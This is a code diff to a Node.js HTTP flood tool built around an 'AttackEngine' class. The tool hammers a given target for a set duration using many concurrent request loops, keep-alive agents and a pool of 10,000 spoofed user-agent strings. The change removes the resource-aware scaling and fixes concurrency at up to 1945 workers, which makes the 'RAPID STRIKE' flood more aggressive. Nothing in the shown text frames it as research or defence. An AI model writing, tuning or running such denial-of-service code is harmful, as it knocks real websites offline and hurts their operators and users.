@@ -5,6 +5,7 @@ const http = require('http');
 const https = require('https');
 const process = require('process');
 
+const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1945); // Reverted to previous logic for MAX_CONCURRENT
 const REQUEST_TIMEOUT = 8000;
 
 // Function to load lines from a file
@@ -29,22 +30,6 @@ const UA_POOL = Array.from({ length: 10000 }, () =>
 // HTTP and HTTPS Keep-Alive agents
 const keepAliveHttp = new http.Agent({ keepAlive: true });
 const keepAliveHttps = new https.Agent({ keepAlive: true });
-
-// Function to dynamically calculate MAX_CONCURRENT based on system resources
-function calculateMaxConcurrent() {
-    const loadAverage = os.loadavg()[0]; // 1-minute load average
-    const freeMemory = os.freemem();
-    const totalMemory = os.totalmem();
-    const memoryThreshold = totalMemory * 0.75;
-    const loadFactor = (loadAverage < 1.5) ? 1 : 0.5;
-    const memoryFactor = freeMemory > memoryThreshold ? 1 : 0.5;
-
-    const baseConcurrent = os.cpus().length * 154;
-    const maxConcurrent = Math.min(baseConcurrent, 3940);
-
-    // Scale based on CPU load and memory
-    return Math.floor(maxConcurrent * loadFactor * memoryFactor);
-}
 
 class AttackEngine {
     constructor(target, duration) {
@@ -113,8 +98,8 @@ class AttackEngine {
     // Start the workers
     async startWorkers() {
         const workers = [];
-        for (let i = 0; i < calculateMaxConcurrent(); i++) {  // Dynamic scaling
-            workers.push(this.workerLoop());
+        for (let i = 0; i < MAX_CONCURRENT; i++) {  // Fixed to MAX_CONCURRENT
+            workers.push(this.workerLoop());  // Send requests in the background without blocking
         }
         await Promise.all(workers);
     }
@@ -123,7 +108,7 @@ class AttackEngine {
     async workerLoop() {
         while (this.running && Date.now() - this.startTime < this.duration) {
             this.stats.total++;
-            await this.makeRequest();
+            await this.makeRequest();  // Fire requests instantly in the background
         }
     }
 
@@ -135,7 +120,7 @@ class AttackEngine {
             console.log('  ============================================');
             console.log(`  TARGET: ${this.target}`);
             console.log(`  TIME:   ${this.duration / 1000}s`);
-            console.log(`  MODE:   RAPID STRIKE - ${calculateMaxConcurrent()} Concurrent`);
+            console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
             console.log('  ============================================\n');
         };
 
